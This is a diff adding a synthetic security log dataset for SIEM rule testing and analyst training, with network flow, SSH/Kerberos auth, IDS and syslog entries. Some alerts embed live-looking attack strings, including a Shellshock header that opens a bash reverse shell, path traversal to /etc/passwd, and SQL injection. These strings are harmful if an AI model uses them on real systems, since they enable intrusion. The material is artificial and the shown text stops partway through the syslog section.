@@ -1,0 +1,379 @@
+================================================================================
+                    SYNTHETIC SECURITY TEST LOGS
+              Log Investigation Framework - Combined Dataset
+================================================================================
+Generated: March 2026
+Total Entries: 130 logs across 5 categories
+Purpose: Security testing, SIEM rule validation, and analyst training
+WARNING: Contains simulated attack patterns and anomalies
+================================================================================
+
+################################################################################
+# CATEGORY 1: NETWORK FLOW / NETFLOW / ZEEK CONN LOGS (30 entries)
+################################################################################
+
+--- Format A: Raw Zeek/NetFlow Tab-Delimited (10 entries) ---
+
+2026-03-04T22:15:23.456789Z	CxYz987654321	192.168.10.45	54321	45.67.89.123	443	tcp	ssl	12.345	24567	134589	SF	-	-	0	ShADadfF	45	28901	32	142345	
+2026-03-04T22:16:01.123456Z	Cabc123DEF456	10.0.0.55	60000	8.8.8.8	53	udp	dns	0.012	78	234	SHR	-	-	0	Dd	2	150	2	300	
+2026-03-04T22:16:45.789012Z	Cdef789GHI012	172.16.1.10	22	203.0.113.50	22	tcp	ssh	0.003	120	80	S0	-	-	0	S	3	240	0	0	
+2026-03-04T22:17:12.345678Z	CghI345JKL678	192.168.5.20	12345	198.51.100.75	445	tcp	smb	180.567	3456789	12345678	OTH	-	-	0	^AdA	120	4567890	98	13456789	
+2026-03-04T22:17:59.012345Z	CjKl901MNO234	10.1.1.100	8080	93.184.216.34	80	tcp	http	0.089	567	23456	SF	-	-	0	ShADaF	8	890	15	24567	
+2026-03-04T22:18:30.678901Z	CmNo567PQR890	172.20.0.30	53	192.0.2.1	53	udp	dns	0.001	45	120	SHR	-	-	0	D	1	80	1	150	
+2026-03-04T22:19:05.234567Z	CpQr123STU456	192.168.1.1	4444	185.199.108.153	443	tcp	ssl	0.045	234	56789	SF	-	-	0	ShADf	5	500	12	58000	
+2026-03-04T22:19:40.890123Z	CstU789VWX012	10.0.5.50	3306	203.0.113.100	3306	tcp	-	300.123	1234567	9876543	OTH	-	-	0	^	200	2345678	150	10987654	
+2026-03-04T22:20:15.456789Z	CvWx345YZA678	172.16.5.10	0	198.51.100.200	0	icmp	-	0.000	0	0	OTH	-	-	0	-	10	800	10	800	
+2026-03-04T22:20:50.123456Z	CyZa901BCD234	192.168.20.15	22	45.67.89.200	22	tcp	ssh	0.002	150	90	RSTR	-	-	0	Sr	4	300	3	250	
+
+--- Format B: JSON Zeek Conn Logs (10 entries) ---
+
+{"ts":1712345678.123456,"uid":"C1a2b3c4d5e6f7g8h","id.orig_h":"192.168.1.105","id.orig_p":49152,"id.resp_h":"185.220.101.42","id.resp_p":443,"proto":"tcp","service":"ssl","duration":45.234,"orig_bytes":15234,"resp_bytes":89012,"conn_state":"SF","local_orig":true,"local_resp":false,"missed_bytes":0,"history":"ShADadFf","orig_pkts":234,"orig_ip_bytes":45678,"resp_pkts":189,"resp_ip_bytes":123456,"tunnel_parents":[],"notice":"SSL::Invalid_Server_Cert"}
+{"ts":1712345890.456789,"uid":"C2b3c4d5e6f7g8h9i","id.orig_h":"10.0.2.15","id.orig_p":3389,"id.resp_h":"192.168.1.50","id.resp_p":3389,"proto":"tcp","service":"rdp","duration":1200.567,"orig_bytes":4567890,"resp_bytes":2345678,"conn_state":"SF","local_orig":false,"local_resp":true,"missed_bytes":0,"history":"ShAFDaf","orig_pkts":12345,"orig_ip_bytes":5678901,"resp_pkts":9876,"resp_ip_bytes":3456789,"tunnel_parents":[],"notice":""}
+{"ts":1712346012.789012,"uid":"C3c4d5e6f7g8h9i0j","id.orig_h":"192.168.1.100","id.orig_p":52345,"id.resp_h":"8.8.8.8","id.resp_p":53,"proto":"udp","service":"dns","duration":0.023,"orig_bytes":45,"resp_bytes":156,"conn_state":"SF","local_orig":true,"local_resp":false,"missed_bytes":0,"history":"Dd","orig_pkts":1,"orig_ip_bytes":73,"resp_pkts":1,"resp_ip_bytes":184,"tunnel_parents":[],"notice":""}
+{"ts":1712346234.123456,"uid":"C4d5e6f7g8h9i0j1k","id.orig_h":"172.16.0.25","id.orig_p":445,"id.resp_h":"192.168.1.75","id.resp_p":445,"proto":"tcp","service":"smb","duration":0.156,"orig_bytes":124,"resp_bytes":0,"conn_state":"REJ","local_orig":false,"local_resp":true,"missed_bytes":0,"history":"Sr","orig_pkts":2,"orig_ip_bytes":168,"resp_pkts":0,"resp_ip_bytes":0,"tunnel_parents":[],"notice":""}
+{"ts":1712346456.234567,"uid":"C5e6f7g8h9i0j1k2l","id.orig_h":"192.168.1.200","id.orig_p":12345,"id.resp_h":"192.168.1.1","id.resp_p":161,"proto":"udp","service":"snmp","duration":0.045,"orig_bytes":78,"resp_bytes":0,"conn_state":"S0","local_orig":true,"local_resp":true,"missed_bytes":0,"history":"D","orig_pkts":1,"orig_ip_bytes":106,"resp_pkts":0,"resp_ip_bytes":0,"tunnel_parents":[],"notice":""}
+{"ts":1712346678.345678,"uid":"C6f7g8h9i0j1k2l3m","id.orig_h":"10.0.0.99","id.orig_p":49152,"id.resp_h":"45.142.214.123","id.resp_p":8080,"proto":"tcp","service":"http","duration":2.345,"orig_bytes":456,"resp_bytes":8901,"conn_state":"SF","local_orig":true,"local_resp":false,"missed_bytes":0,"history":"ShADadFf","orig_pkts":12,"orig_ip_bytes":892,"resp_pkts":15,"resp_ip_bytes":9456,"tunnel_parents":[],"notice":"HTTP::SQL_Injection_Attacker"}
+{"ts":1712346900.456789,"uid":"C7g8h9i0j1k2l3m4n","id.orig_h":"192.168.1.50","id.orig_p":22,"id.resp_h":"192.168.1.100","id.resp_p":54321,"proto":"tcp","service":"ssh","duration":1800.789,"orig_bytes":2345,"resp_bytes":123456,"conn_state":"SF","local_orig":true,"local_resp":true,"missed_bytes":0,"history":"ShAdDaFf","orig_pkts":567,"orig_ip_bytes":45678,"resp_pkts":2345,"resp_ip_bytes":234567,"tunnel_parents":[],"notice":""}
+{"ts":1712347122.567890,"uid":"C8h9i0j1k2l3m4n5o","id.orig_h":"192.168.1.25","id.orig_p":3389,"id.resp_h":"192.168.1.200","id.resp_p":3389,"proto":"tcp","service":"rdp","duration":0.012,"orig_bytes":0,"resp_bytes":0,"conn_state":"REJ","local_orig":true,"local_resp":true,"missed_bytes":0,"history":"Sr","orig_pkts":1,"orig_ip_bytes":52,"resp_pkts":0,"resp_ip_bytes":0,"tunnel_parents":[],"notice":""}
+{"ts":1712347344.678901,"uid":"C9i0j1k2l3m4n5o6p","id.orig_h":"10.0.1.50","id.orig_p":49153,"id.resp_h":"192.168.1.1","id.resp_p":53,"proto":"udp","service":"dns","duration":0.034,"orig_bytes":52,"resp_bytes":128,"conn_state":"SF","local_orig":true,"local_resp":true,"missed_bytes":0,"history":"Dd","orig_pkts":1,"orig_ip_bytes":80,"resp_pkts":1,"resp_ip_bytes":156,"tunnel_parents":[],"notice":""}
+{"ts":1712347566.789012,"uid":"C0j1k2l3m4n5o6p7q","id.orig_h":"172.16.0.10","id.orig_p":445,"id.resp_h":"192.168.1.25","id.resp_p":445,"proto":"tcp","service":"smb","duration":45.678,"orig_bytes":123456,"resp_bytes":78901,"conn_state":"SF","local_orig":false,"local_resp":true,"missed_bytes":0,"history":"ShADadFf","orig_pkts":234,"orig_ip_bytes":234567,"resp_pkts":156,"resp_ip_bytes":123456,"tunnel_parents":[],"notice":"SMB::EternalBlue_Signature"}
+
+--- Format C: Extended NetFlow with Context (10 entries) ---
+
+[LOG-001] [NetFlow] 2024-03-15T02:14:33.412Z
+ts=1710468873.412 uid=CXWfTz3Mnd4Yq1aB src_ip=192.168.1.105 src_port=51423 dst_ip=185.220.101.47 dst_port=9001 proto=tcp duration=3847.21 orig_bytes=512 resp_bytes=2097152 conn_state=SF service=- orig_pkts=4821 resp_pkts=9102
+
+[LOG-002] [NetFlow] 2024-03-15T03:55:01.009Z
+ts=1710474901.009 uid=DZabNq8Lrt2Wx7cE src_ip=10.0.0.44 src_port=41290 dst_ip=10.0.0.1 dst_port=22 proto=tcp duration=0.001 orig_bytes=60 resp_bytes=0 conn_state=REJ service=ssh orig_pkts=1 resp_pkts=0
+
+[LOG-003] [Zeek Conn] 2024-03-15T04:02:11.883Z
+ts=1710475331.883 uid=EAknMp7Qsv3Yz8dF src_ip=10.0.0.44 src_port=41291 dst_ip=10.0.0.1 dst_port=22 proto=tcp duration=0.001 orig_bytes=60 resp_bytes=0 conn_state=REJ service=ssh orig_pkts=1 resp_pkts=0 [repeated pattern: 10.0.0.44 -> 10.0.0.1:22 x438 in 120s]
+
+[LOG-004] [NetFlow] 2024-03-15T07:30:00.000Z
+ts=1710487800.000 uid=FBloPr9Rtw4Za9eG src_ip=192.168.0.200 src_port=63201 dst_ip=8.8.8.8 dst_port=53 proto=udp duration=0.003 orig_bytes=512 resp_bytes=4096 conn_state=SF service=dns query_count=1 response_ttl=0
+
+[LOG-005] [Zeek Conn] 2024-03-15T11:15:44.210Z
+ts=1710501344.210 uid=GCmpQs0Sux5Ab0fH src_ip=172.16.4.88 src_port=49222 dst_ip=203.0.113.55 dst_port=443 proto=tcp duration=1201.44 orig_bytes=843 resp_bytes=921 conn_state=SF service=ssl ja3=a0e9f5d64349fb13191bc781f81f42e1 ja3s=c884d4559a01d18b40a4a3f2dc62bba4
+
+[LOG-006] [NetFlow] 2024-03-15T14:22:09.771Z
+ts=1710512529.771 uid=HDnqRt1Tvy6Bc1gI src_ip=192.168.1.45 src_port=52001 dst_ip=192.168.1.1 dst_port=80 proto=tcp duration=0.002 orig_bytes=48000 resp_bytes=200 conn_state=SF service=http method=GET uri="/%2e%2e/%2e%2e/%2e%2e/etc/passwd" status_code=200
+
+[LOG-007] [Zeek Conn] 2024-03-15T22:48:59.003Z
+ts=1710542939.003 uid=IEorSu2Uwz7Cd2hJ src_ip=10.0.3.15 src_port=33901 dst_ip=10.0.3.1 dst_port=445 proto=tcp duration=0.441 orig_bytes=240 resp_bytes=180 conn_state=SF service=smb smb_command=TREE_CONNECT smb_share=\\10.0.3.1\ADMIN$
+
+[LOG-008] [NetFlow] 2024-03-15T23:01:12.580Z
+ts=1710543672.580 uid=JFpsSv3Vxa8De3iK src_ip=10.10.10.5 src_port=0 dst_ip=10.10.10.255 dst_port=0 proto=icmp icmp_type=8 icmp_code=0 duration=0.000 orig_bytes=28 resp_bytes=0 conn_state=OTH [broadcast sweep: 256 hosts in 4s]
+
+[LOG-009] [Zeek Conn] 2024-03-16T01:00:00.000Z
+ts=1710550800.000 uid=KGqtTw4Wyb9Ef4jL src_ip=192.168.50.22 src_port=55102 dst_ip=91.108.4.11 dst_port=443 proto=tcp duration=86401.00 orig_bytes=1024 resp_bytes=1024 conn_state=SF service=ssl bytes_ratio=1.00 beacon_score=0.97 jitter=0.001
+
+[LOG-010] [NetFlow] 2024-03-16T02:33:47.129Z
+ts=1710556427.129 uid=LHruUx5Xzc0Fg5kM src_ip=192.168.1.200 src_port=49103 dst_ip=192.168.1.100 dst_port=3389 proto=tcp duration=7200.33 orig_bytes=10485760 resp_bytes=52428800 conn_state=SF service=rdp encryption=none
+
+################################################################################
+# CATEGORY 2: AUTH / SSH / LOGIN LOGS (30 entries)
+################################################################################
+
+--- Format A: Standard SSH Auth Logs (10 entries) ---
+
+Mar  4 22:15:10 srv01 sshd[23456]: Failed password for invalid user admin from 185.199.110.153 port 54321 ssh2
+Mar  4 22:15:12 srv01 sshd[23456]: Failed password for invalid user root from 185.199.110.153 port 54322 ssh2
+Mar  4 22:15:15 srv01 sshd[23456]: Failed password for invalid user oracle from 185.199.110.153 port 54323 ssh2
+Mar  4 22:15:45 srv01 sshd[24567]: Accepted publickey for ubuntu from 192.168.10.200 port 41234 ssh2
+Mar  4 22:16:03 srv02 pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.77
+Mar  4 22:16:55 srv01 sshd[25678]: Accepted password for root from 10.1.1.150 port 22 ssh2
+Mar  4 22:17:20 srv03 sshd[26789]: Failed password for invalid user postgres from 198.51.100.33 port 60000 ssh2
+Mar  4 22:18:10 srv01 sshd[27890]: Connection from 45.67.89.100 port 12345 on 0.0.0.0 port 22
+Mar  4 22:19:30 srv02 sshd[28901]: Accepted keyboard-interactive/pam for devuser from 172.16.1.50 port 55555 ssh2
+Mar  4 22:20:05 srv01 sshd[29012]: Failed password for invalid user test from 93.184.216.34 port 33333 ssh2
+
+--- Format B: Brute Force & Key Auth Patterns (20 entries) ---
+
+Mar 15 08:23:45 server01 sshd[2345]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
+Mar 15 08:23:46 server01 sshd[2346]: Failed password for invalid user root from 192.168.1.100 port 54322 ssh2
+Mar 15 08:23:47 server01 sshd[2347]: Failed password for invalid user test from 192.168.1.100 port 54323 ssh2
+Mar 15 08:23:48 server01 sshd[2348]: Failed password for invalid user guest from 192.168.1.100 port 54324 ssh2
+Mar 15 08:23:49 server01 sshd[2349]: Failed password for invalid user oracle from 192.168.1.100 port 54325 ssh2
+Mar 15 08:23:50 server01 sshd[2350]: Failed password for invalid user postgres from 192.168.1.100 port 54326 ssh2
+Mar 15 08:23:51 server01 sshd[2351]: Failed password for invalid user mysql from 192.168.1.100 port 54327 ssh2
+Mar 15 08:23:52 server01 sshd[2352]: Failed password for invalid user tomcat from 192.168.1.100 port 54328 ssh2
+Mar 15 08:23:53 server01 sshd[2353]: Failed password for invalid user apache from 192.168.1.100 port 54329 ssh2
+Mar 15 08:23:54 server01 sshd[2354]: Accepted password for jsmith from 192.168.1.100 port 54330 ssh2
+
+Mar 15 09:15:33 server02 sshd[4567]: Accepted publickey for dbadmin from 10.0.0.25 port 56789 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:34 server02 sshd[4568]: Accepted publickey for dbadmin from 10.0.0.25 port 56790 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:35 server02 sshd[4569]: Accepted publickey for dbadmin from 10.0.0.25 port 56791 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:36 server02 sshd[4570]: Accepted publickey for dbadmin from 10.0.0.25 port 56792 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:37 server02 sshd[4571]: Accepted publickey for dbadmin from 10.0.0.25 port 56793 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:38 server02 sshd[4572]: Accepted publickey for dbadmin from 10.0.0.25 port 56794 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:39 server02 sshd[4573]: Accepted publickey for dbadmin from 10.0.0.25 port 56795 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:40 server02 sshd[4574]: Accepted publickey for dbadmin from 10.0.0.25 port 56796 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:41 server02 sshd[4575]: Accepted publickey for dbadmin from 10.0.0.25 port 56797 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+Mar 15 09:15:42 server02 sshd[4576]: Accepted publickey for dbadmin from 10.0.0.25 port 56798 ssh2: RSA SHA256:ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZ
+
+--- Format C: Extended Auth with Context (10 entries) ---
+
+[LOG-011] [Auth/SSH] 2024-03-15T00:01:14.003Z
+Mar 15 00:01:14 prod-server sshd[3821]: Failed password for root from 45.33.32.156 port 43812 ssh2
+
+[LOG-012] [Auth/SSH] 2024-03-15T00:01:15.110Z
+Mar 15 00:01:15 prod-server sshd[3822]: Failed password for root from 45.33.32.156 port 43813 ssh2
+
+[LOG-013] [Auth/SSH] 2024-03-15T00:01:16.204Z
+Mar 15 00:01:16 prod-server sshd[3823]: Failed password for admin from 45.33.32.156 port 43814 ssh2 [count=847 in 60s from same source]
+
+[LOG-014] [Auth/SSH] 2024-03-15T03:44:19.000Z
+Mar 15 03:44:19 prod-server sshd[4012]: Accepted publickey for deploy from 203.0.113.77 port 58021 ssh2: RSA SHA256:zMqxMpMaKTCxbDJaGS9H7V0uZ2ePq3Rz8nYdKwFbUoE
+
+[LOG-015] [Auth/SSH] 2024-03-15T03:44:20.880Z
+Mar 15 03:44:20 prod-server sshd[4013]: pam_unix(sshd:session): session opened for user deploy by (uid=0) [NOTE: user deploy has never logged in from 203.0.113.77 before; previous 90-day logins: 10.0.1.x range only]
+
+[LOG-016] [Auth/SSH] 2024-03-15T09:17:33.441Z
+Mar 15 09:17:33 dc01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: NULL SID Account Name: - Logon Type: 3 Failure Reason: Unknown user name or bad password Account For Which Logon Failed: Administrator Workstation Name: DESKTOP-4XZ8Q1 Source Network Address: 10.0.5.77
+
+[LOG-017] [Auth/SSH] 2024-03-15T09:17:34.003Z
+Mar 15 09:17:34 dc01 Microsoft-Windows-Security-Auditing[4768]: A Kerberos authentication ticket (TGT) was requested. Account Name: svc_backup Supplied Realm Name: CORP.LOCAL Client Address: ::ffff:10.0.5.77 Result Code: 0x12 [PREAUTH_FAILED] EncryptionType: 0x17
+
+[LOG-018] [Auth/SSH] 2024-03-15T13:05:00.000Z
+Mar 15 13:05:00 webserver01 sudo: jdoe : TTY=pts/1 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/bash [jdoe has not used sudo in 47 days; last command was: /usr/bin/id]
+
+[LOG-019] [Auth/SSH] 2024-03-15T15:30:22.711Z
+Mar 15 15:30:22 authsrv pam_unix[9021]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.14 user=www-data
+
+[LOG-020] [Auth/SSH] 2024-03-16T00:00:01.000Z
+Mar 16 00:00:01 dc01 Microsoft-Windows-Security-Auditing[4769]: A Kerberos service ticket was requested. Account Name: svc_sql$@CORP.LOCAL Service Name: krbtgt/CORP.LOCAL Client Address: ::ffff:10.0.2.55 Ticket Options: 0x40800010 Ticket Encryption Type: 0x17 Failure Code: 0x0 [ticket requested for krbtgt; source is non-DC host]
+
+################################################################################
+# CATEGORY 3: FIREWALL / IDS / SNORT / SURICATA ALERTS (30 entries)
+################################################################################
+
+--- Format A: Snort/Suricata Text Alerts (10 entries) ---
+
+[**] [1:1234567:2] Potential outbound connection to known bad domain [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.1.10:54321 -> 185.199.108.153:443
+[DROP] IN=ens33 OUT= MAC=00:11:22:33:44:55 SRC=10.0.0.55 DST=192.168.10.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=60000 DPT=445 WINDOW=29200 RES=0x00 SYN URGP=0
+[**] [1:2010937:3] ET SCAN Suspicious inbound to mySQL port [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 203.0.113.50:3306 -> 172.16.5.10:3306
+[UFW BLOCK] IN=eth0 OUT= MAC=aa:bb:cc:dd:ee:ff SRC=45.67.89.123 DST=10.1.1.100 LEN=40 TOS=0x00 PREC=0x00 TTL=54 ID=54321 PROTO=TCP SPT=12345 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0
+[**] [1:2000342:5] ET POLICY Possible data exfiltration over HTTP [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.20.15:8080 -> 93.184.216.34:80
+[DROP] IN=ens192 OUT= SRC=172.20.0.30 DST=198.51.100.75 LEN=52 TOS=0x00 PREC=0x00 TTL=63 ID=98765 PROTO=UDP SPT=53 DPT=53 LEN=32
+[**] [1:1234568:1] Unusual SMB traffic volume [**] [Classification: Potential Recon] [Priority: 3] {TCP} 10.0.5.50:445 -> 185.199.110.153:445
+[UFW BLOCK] IN=eth1 OUT= SRC=198.51.100.200 DST=172.16.1.10 LEN=48 TOS=0x00 PREC=0x00 TTL=117 ID=11111 PROTO=TCP SPT=4444 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+[**] [1:2012345:4] ET EXPLOIT Possible buffer overflow attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 45.67.89.200:1234 -> 192.168.10.45:22
+[DROP] IN=lo OUT= SRC=127.0.0.1 DST=127.0.0.1 LEN=60 PROTO=ICMP TYPE=8 CODE=0 ID=1234 SEQ=1
+
+--- Format B: MSSQL Scan & CnC Alerts (20 entries) ---
+
+03/15/2024-08:45:12.345678  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52345 -> 192.168.1.50:1433
+03/15/2024-08:45:13.456789  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52346 -> 192.168.1.50:1433
+03/15/2024-08:45:14.567890  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52347 -> 192.168.1.50:1433
+03/15/2024-08:45:15.678901  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52348 -> 192.168.1.50:1433
+03/15/2024-08:45:16.789012  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52349 -> 192.168.1.50:1433
+03/15/2024-08:45:17.890123  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52350 -> 192.168.1.50:1433
+03/15/2024-08:45:18.901234  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52351 -> 192.168.1.50:1433
+03/15/2024-08:45:19.012345  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52352 -> 192.168.1.50:1433
+03/15/2024-08:45:20.123456  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52353 -> 192.168.1.50:1433
+03/15/2024-08:45:21.234567  [**] [1:2010937:6] ET SCAN Suspicious inbound to MSSQL port 1433 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 45.142.214.123:52354 -> 192.168.1.50:1433
+
+03/15/2024-10:23:45.678901  [**] [1:2025644:1] ET MALWARE Possible CnC Response [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 185.220.101.42:443 -> 192.168.1.105:49152
+03/15/2024-10:24:12.789012  [**] [1:2013504:5] ET POLICY Executable and linking format (ELF) file download [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 185.220.101.42:80 -> 192.168.1.105:49153
+03/15/2024-10:25:33.890123  [**] [1:2022334:3] ET TROJAN Possible Metasploit Payload Common Construct Bind_API Seen [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.1.105:49154 -> 185.220.101.42:4444
+03/15/2024-11:45:22.901234  [**] [1:2002910:6] ET SCAN Potential SSH Scan OUTBOUND [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100:54321 -> 10.0.0.50:22
+03/15/2024-11:45:23.012345  [**] [1:2002910:6] ET SCAN Potential SSH Scan OUTBOUND [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100:54322 -> 10.0.0.51:22
+03/15/2024-11:45:24.123456  [**] [1:2002910:6] ET SCAN Potential SSH Scan OUTBOUND [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100:54323 -> 10.0.0.52:22
+03/15/2024-11:45:25.234567  [**] [1:2002910:6] ET SCAN Potential SSH Scan OUTBOUND [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100:54324 -> 10.0.0.53:22
+03/15/2024-11:45:26.345678  [**] [1:2002910:6] ET SCAN Potential SSH Scan OUTBOUND [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100:54325 -> 10.0.0.54:22
+03/15/2024-11:45:27.456789  [**] [1:2002910:6] ET SCAN Potential SSH Scan OUTBOUND [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100:54326 -> 10.0.0.55:22
+03/15/2024-11:45:28.567890  [**] [1:2002910:6] ET SCAN Potential SSH Scan OUTBOUND [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100:54327 -> 10.0.0.56:22
+
+--- Format C: Extended IDS with JSON & Context (10 entries) ---
+
+[LOG-021] [Snort] 2024-03-15T01:22:03.009Z
+[**] [1:2001219:20] ET SCAN Nmap Scripting Engine User-Agent Detected [**] [Classification: Web Application Attack] [Priority: 1] 01/15-01:22:03.009000 10.0.1.99:54321 -> 192.168.1.1:80 TCP TTL:64 TOS:0x0 ID:54321 IpLen:20 DgmLen:60
+
+[LOG-022] [Suricata] 2024-03-15T02:10:44.882Z
+{"timestamp":"2024-03-15T02:10:44.882+0000","event_type":"alert","src_ip":"192.168.4.10","src_port":49201,"dest_ip":"10.0.0.5","dest_port":4444,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2011540,"rev":5,"signature":"ET MALWARE Possible Meterpreter Reverse TCP Shell","category":"A Network Trojan was Detected","severity":1},"payload":"TVo="}
+
+[LOG-023] [Firewall] 2024-03-15T05:33:17.003Z
+Mar 15 05:33:17 fw01 DENY IN=eth0 OUT= MAC=... SRC=198.51.100.88 DST=10.0.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=241 ID=54321 PROTO=TCP SPT=62000 DPT=23 WINDOW=1024 SYN [flags: port scan pattern detected on 1024 ports in 30s]
+
+[LOG-024] [Suricata] 2024-03-15T08:04:59.110Z
+{"timestamp":"2024-03-15T08:04:59.110+0000","event_type":"alert","src_ip":"10.0.1.14","src_port":80,"dest_ip":"192.168.2.50","dest_port":49881,"proto":"TCP","http":{"hostname":"internal-app","url":"/api/v1/users","http_method":"GET","http_user_agent":"() { :; }; /bin/bash -i >& /dev/tcp/10.0.1.14/9999 0>&1","status":200},"alert":{"signature":"ET WEB_SERVER ShellShock HTTP Header","severity":1}}
+
+[LOG-025] [Snort] 2024-03-15T10:15:00.000Z
+[**] [1:1000001:1] CUSTOM SQL Injection Attempt [**] [Classification: Web Application Attack] [Priority: 1] 03/15-10:15:00.000000 172.16.0.88:50021 -> 192.168.1.10:80 TCP TTL:128 HTTP GET /login.php?user=admin%27%20OR%201=1-- HTTP/1.1
+
+[LOG-026] [Firewall] 2024-03-15T12:00:00.000Z
+Mar 15 12:00:00 fw01 ALLOW IN=eth1 OUT=eth0 SRC=10.0.9.254 DST=10.0.0.1 PROTO=ICMP TYPE=8 CODE=0 [ANOMALY: src 10.0.9.254 does not exist in DHCP leases or asset inventory; traffic volume 840Mbps on ICMP]
+
+[LOG-027] [Suricata] 2024-03-15T16:44:21.009Z
+{"timestamp":"2024-03-15T16:44:21.009+0000","event_type":"alert","src_ip":"192.168.1.77","src_port":53222,"dest_ip":"185.234.218.2","dest_port":53,"proto":"UDP","dns":{"type":"query","rrtype":"TXT","rrname":"aGVsbG8gd29ybGQ=.c2.exfil-domain.net"},"alert":{"signature":"ET DNS Long TXT Query Possible DNS Tunneling","severity":2},"payload_printable":"...base64 encoded blob 4096 bytes..."}
+
+[LOG-028] [Firewall] 2024-03-15T20:12:08.881Z
+Mar 15 20:12:08 fw01 DENY IN=dmz OUT=lan SRC=10.50.0.12 DST=10.0.0.0/8 LEN=52 PROTO=TCP DPT=445 [Policy: DMZ->LAN lateral movement blocked; 10.50.0.12 is a web server with no business need to reach internal SMB]
+
+[LOG-029] [Snort] 2024-03-15T21:09:33.002Z
+[**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] 03/15-21:09:33.002000 192.168.1.88:80 -> 10.10.10.5:49301 TCP RESPONSE BODY contains: uid=0(root) gid=0(root) groups=0(root)
+
+[LOG-030] [Suricata] 2024-03-16T03:07:14.441Z
+{"timestamp":"2024-03-16T03:07:14.441+0000","event_type":"alert","src_ip":"10.0.2.44","src_port":49900,"dest_ip":"10.0.2.1","dest_port":80,"proto":"TCP","http":{"url":"/cgi-bin/../../../../bin/sh","http_method":"POST","http_content_type":"application/x-www-form-urlencoded","http_user_agent":"Mozilla/4.0"},"alert":{"signature":"ET WEB_SERVER CGI Path Traversal Attempt","severity":1}}
+
+################################################################################
+# CATEGORY 4: SYSLOG / SYSTEM LOGS (20 entries)
+################################################################################
+
+--- Format A: Linux System Logs (10 entries) ---
+
+Mar  4 22:15:30 srv01 kernel: [12345.678901] IPv4: martian source 192.0.2.1 from 10.0.0.55, on dev ens33
+Mar  4 22:16:12 srv02 systemd[1]: Started session 1234 of user devuser.
+Mar  4 22:16:45 srv01 kernel: [12346.234567] UFW BLOCK: IN=ens33 OUT= MAC= SRC=203.0.113.77 DST=172.16.5.10 LEN=40 PROTO=TCP SPT=54321 DPT=3306
+Mar  4 22:17:05 srv03 rsyslogd[890]: imudp: 234 messages lost because of queue overflow
+Mar  4 22:17:55 srv01 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
+Mar  4 22:18:20 srv02 kernel: [12347.890123] Out of memory: Killed process 5678 (curl) total-vm:12345678kB
